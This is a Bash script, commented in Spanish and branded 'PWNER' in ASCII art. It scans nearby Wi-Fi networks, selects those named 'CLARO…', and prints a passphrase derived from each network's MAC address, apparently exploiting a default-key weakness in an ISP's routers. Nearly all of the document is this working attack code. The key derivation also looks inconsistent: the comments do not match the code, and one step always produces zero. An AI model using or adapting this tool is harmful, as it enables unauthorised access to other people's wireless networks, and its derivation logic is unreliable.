#!/bin/bash
num=0
clr=0

# Reset
Color_Off='\033[0m'        

# Regular Colors
Red='\033[0;31m'          # rojo
White='\033[0;37m'        # blanco

#ASCII art
echo -e '\033[0;31m             
                           ..:?ODDDDDDDDDDDDDDOI:..                             
                        .,=8DDDDDD88888888888DDDDD8?,.                          
                     .,=DDDDDD88OOZZ$7?+?7$ZZO888DDDDD?,                        
                   .:7DDDDD88OZ7==~~~~~~~~~~~==?ZO88DDDD7,                      
                 .,?DDDDD88OI+===================+7Z88DDDD$,.                   
                .=DDDDD88O7I????????????????????????7O88DDDD=.                  
               .IDDDDD88O7777777$$77777777777777777777O88DDDDI,                 
              ,$DDDDD88OZZZZZOOOOOOOOOOOOOOOOOOZZZZZZZZZ88DDDDO,                
             ,ODDDDD888OOOO8888888888888888888888888OOOOO88DDDD8,               
            ,ZDDDDD88888888888888888888888888888888888888888DDDDZ,              
           .IDDDDD8888888888888888888888888888888888888888888DDDD?.             
           :DDDDDD888888888888888888888888888888888 .8888888~.DDDD~             
          .IDDDDDD888888888888888888888888888888888 .888888..:DDDDZ.            
          ,8DDDDDD888888888888888888888888888888888  8888.. 888DDDD~            
         .=DDDDDDDDD. .,8888  888888888888888888888..888..$8888DDDD?.           
         .IDDDDDD=. .,.  .88  88888888888888888888888888.8DDDDDDDDDO.           
         .ZDDDDD?  888888  8  88O..    OOO .. 8O ..   O8888DDDDDDDDD.           
         .ZD8888  8888888888  OOO$OOOO  OO .ZOO  8888..:8?    .88888.           
         .ZD8888..8888888888  OOO  ...  OO .OO  OO8888. 888888888888.           
         .?D8888= .888888 .O  OZ. ZZZZ  ZZ  ZO? 7OOO8O..88888888888Z.           
         .=888888Z  .=~.. OO  ZZ..?Z?. .ZZ  ZZZ. .:+.  888888888888?.           
          :888888888    OOOZ  ZZ$.  :$ .$$  ZZZZZ    ZOO88888888888~            
          .I88888888OOOOOOZZZZ$$$$$$$$$$$$$$$$ZZZZZOOOOOO888888888Z,            
           :8888888OOOOOOZZZZ$$$$$77\033[0;37mPWNER\033[0;31m77$$$$$ZZZZOOOOOO88888888~.            
           .I88888OOOOOOZZZZ$$$$777777777777$$$$$ZZZZOOOOOO888888I.             
            .Z888OOOOOOOZZZ$$$$777777777777777$$$ZZZZZOOOOOO8888Z,              
             ,888OOOOOOZZZZ$$$$7777777I7777777$$$$ZZZZOOOOOO8888,               
              ,O8OOOOOOZZZZ$$$$777777777777777$$$$ZZZZOOOOOOO88:                
               .Z8OOOOOZZZZ$$$$777777777777777$$$$ZZZZOOOOOO8$.                 
                .~8OOOOOZZZZ$$$$7777777777777$$$$ZZZZZOOOOOO=.                  
                  ,?OOOOZZZZ$$$$$77777777777$$$$$ZZZZOOOOO$,                    
                   .:ZOOZZZZZ$$$$$$7777777$$$$$$ZZZZZOOOO:.                     
                     .,?OOZZZZ$$$$$$$$$$$$$$$$$ZZZZOOO7:.                       
                        .:IZOZZZZ$$$$$$$$$$$$ZZZZOO7:..                         
                         . .,~?$ZZZZZZZZZZZZZZ$?~,.                             
\033[0;37m';
#chequeando tener los privilegios requeridos por iwlist
user=`whoami`
 if [[ $user != "root" ]]
 then
	echo "$user, debes ser root para escanear las redes"
	echo "O ejecuta \"sudo !!\" si eres un sudoer"
	exit
 fi
#regex que hace match con los ESSID afectados
pat0="^CLARO[[:xdigit:]]{8}$"
pat1="^CLARO"

#obtenemos interfaz inalambrica y escaneamos
iwconfig &> /tmp/wnics;
int=$(cat /tmp/wnics |grep -v 'no wireless extensions\|^[[:space:]]'| awk '{print $1}'|sort -r);
 if [ -z "$int" ];
 then
 	echo "No se encontraron interfaces de red inalámbrica disponibles";
 	exit
 fi
/usr/sbin/iwlist $int scan |grep 'Cell\|ESSID' &> /tmp/wlans;

# validando si el controlador de la WNIC soporta scan
resp=$(cat /tmp/wlans);
 if [[ $resp == *support* ]]
 then
	echo "La interfaz de red inalámbrica $int no soporta scaneo";
	exit;
 fi

# numero de redes encontradas
num=$(wc -l /tmp/wlans|awk '{print $1}');
num=`expr $num / 2`;

for i in `seq 1 $num`;
 do
	exec < /tmp/wlans;
	# leemos BSSID de cada red
		read a1;
		mac=$(echo $a1|awk '{print $5}');
	# leemos ESSID
		read a2;
		nom=$(echo $a2|cut -c8- |cut -d\" -f1);
	# comparamos ESSID con cada patrón
		if [[ $nom =~ $pat0 ]] || [[ $nom =~ $pat1 ]] 
		then
	# si hace match quita el primer y ultimo par de hexadecimales
	# del BSSID (MAC address) y se agrega al ultimo un 0 en el ultimo lugar
			clr=1
			pre=$(echo $mac|cut -c1-|sed "s/://g"|rev|cut -c2-|rev)
			suf=$(echo $mac|cut -c17-)
			echo -e '			+----------------------------+';
			echo -e "			" ESSID: $nom   
			echo -e "			" MAC  : $mac   
			hex=$(($suf-$suf));
			hex=$(printf "%X\n" $hex);
			echo -e "			" PASSPHRASE: $pre$hex
			echo -e '			+----------------------------+\n';
		fi
		
		sed -i -e "1d" /tmp/wlans
		sed -i -e "1d" /tmp/wlans
 done

if [[ $clr == "0" ]]
then
	echo "No se encontraron redes con el patron necesario"
fi

rm /tmp/wnics /tmp/wlans
